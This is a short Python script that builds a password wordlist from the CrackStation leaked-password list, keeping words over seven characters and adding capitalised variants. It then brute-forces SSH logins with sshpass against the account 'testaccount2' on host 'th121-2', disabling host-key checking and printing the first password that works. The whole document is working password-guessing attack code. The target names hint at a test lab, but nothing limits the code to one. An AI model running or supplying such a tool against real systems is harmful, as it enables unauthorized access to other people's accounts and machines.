dict = open("crackstation-human-only.txt","r")
altDict = []
for word in dict:
    if (len(word) > 7):
        altDict.append(word)
        if(word.capitalize() not in altDict):
            altDict.append(word.capitalize())
newDict = open("passwords.txt","w")
for word in altDict:
    if (len(word) > 7):
        newDict.write(word)

import os
import time

f = open("passwords2.txt", "r")

for passwd in f:
        stmt = "sshpass -p " + passwd.strip() +  " ssh -o StrictHostKeyChecking=no  testaccount2@th121-2"
        print(stmt)
        log = os.system(stmt)
        if (log == 0):
                print(passwd)
                break
